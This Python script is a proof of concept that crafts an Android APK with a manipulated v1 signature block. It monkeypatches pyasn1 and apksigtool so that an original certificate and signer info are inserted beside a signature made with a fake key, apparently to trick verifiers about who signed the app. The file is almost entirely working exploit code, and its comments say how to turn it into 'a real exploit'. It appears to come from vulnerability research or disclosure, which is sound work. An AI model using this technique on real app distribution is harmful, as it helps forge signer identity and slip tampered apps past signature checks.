#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import apksigcopier
import apksigtool
import pyasn1.codec.cer.encoder as cer_encoder
import zipfile

from apksigtool import (                                        # type: ignore[attr-defined]
    JARSignatureFile, PrivKey, ECDSA, PKCS1v15, Halgo, PRIVKEY_TYPE,
    JAR_HASHERS_STR, DIGEST_ENCRYPTION_ALGORITHM, pyasn1_decode, pyasn1_encode,
    pyasn1_univ, rfc2315, create_signature, do_sign)
from typing import Optional, Tuple


# patched copy that doesn't sort setOf so we can reliably insert the fake cert
def encodeValue(self, value, asn1Spec, encodeFun, **options):   # type: ignore
    chunks = self._encodeComponents(
        value, asn1Spec, encodeFun, **options)
    return cer_encoder.null.join(chunks), True, True            # type: ignore


# patched copy that doesn't raise, just warns
def _assert(b: bool, what: Optional[str] = None) -> None:
    if not b:
        print("Assertion failed" + (f": {what}" if what else ""))


# patched copy that adds the fake cert
def _create_signature_block_file(sf: JARSignatureFile, *, cert: bytes, key: PrivKey,
                                 hash_algo: str) -> Tuple[bytes, str]:
    def halgo_f() -> Halgo:
        return ECDSA(halgo()) if alg == "EC" else halgo()       # type: ignore
    alg, = [e for c, e in PRIVKEY_TYPE.items() if isinstance(key, c)]
    oid, _, halgo = JAR_HASHERS_STR[hash_algo]
    dea = DIGEST_ENCRYPTION_ALGORITHM[alg][hash_algo]
    pad = PKCS1v15 if alg == "RSA" else None
    crt = pyasn1_decode(cert, asn1Spec=rfc2315.Certificate())[0]
    sig = create_signature(key, sf.raw_data, halgo_f, pad)
    sdat = rfc2315.SignedData()
    sdat["version"] = 1
    sdat["digestAlgorithms"][0]["algorithm"] = oid
    sdat["contentInfo"] = rfc2315.ContentInfo()
    sdat["contentInfo"]["contentType"] = rfc2315.ContentType(rfc2315.data)
    # --- BEGIN PATCH ---
    print("prepending orig cert (with modified signer info)...")
    sdat["certificates"][0]["certificate"] = orig_crt
    sdat["certificates"][1]["certificate"] = crt
    orig_sinf["issuerAndSerialNumber"]["issuer"] = crt["tbsCertificate"]["issuer"]
    sdat["signerInfos"][0] = orig_sinf
    sinf = sdat["signerInfos"][1]
    # --- END PATCH ---
    sinf["version"] = 1
    sinf["issuerAndSerialNumber"]["issuer"] = crt["tbsCertificate"]["issuer"]
    sinf["issuerAndSerialNumber"]["serialNumber"] = crt["tbsCertificate"]["serialNumber"]
    sinf["digestAlgorithm"]["algorithm"] = oid
    sinf["digestEncryptionAlgorithm"]["algorithm"] = dea
    sinf["encryptedDigest"] = sig
    cinf = rfc2315.ContentInfo()
    cinf["contentType"] = rfc2315.ContentType(rfc2315.signedData)
    cinf["content"] = pyasn1_univ.Any(pyasn1_encode(sdat))
    return pyasn1_encode(cinf), alg


# for a real exploit we'd have a v1-signed APK to use here instead of signing ourselves
# must have minSdk >= 24 & targetSdk < 30
apksigcopier.copy_apk("app3.apk", "poc-unsigned.apk", exclude=apksigcopier.exclude_meta)
do_sign("poc-unsigned.apk", "poc-signed-orig.apk", cert="cert-rsa-orig.der",
        key="privkey-rsa-orig.der", no_v2=True, no_v3=True)

with zipfile.ZipFile("poc-signed-orig.apk", "r") as zf:
    for info in zf.infolist():
        if info.filename.startswith("META-INF/") and info.filename.endswith(".RSA"):
            print(f"Getting cert from {info.filename!r}...")
            data = zf.read(info.filename)
            cinf = pyasn1_decode(data, asn1Spec=rfc2315.ContentInfo())[0]
            sdat = pyasn1_decode(cinf["content"], asn1Spec=rfc2315.SignedData())[0]
            orig_sinf = sdat["signerInfos"][0]
            orig_crt = sdat["certificates"][0]["certificate"]
            break

cer_encoder.SetOfEncoder.encodeValue = encodeValue              # type: ignore
apksigtool._assert = _assert
apksigtool._create_signature_block_file = _create_signature_block_file

do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa-fake.der",
        key="privkey-rsa-fake.der", no_v2=True, no_v3=True)
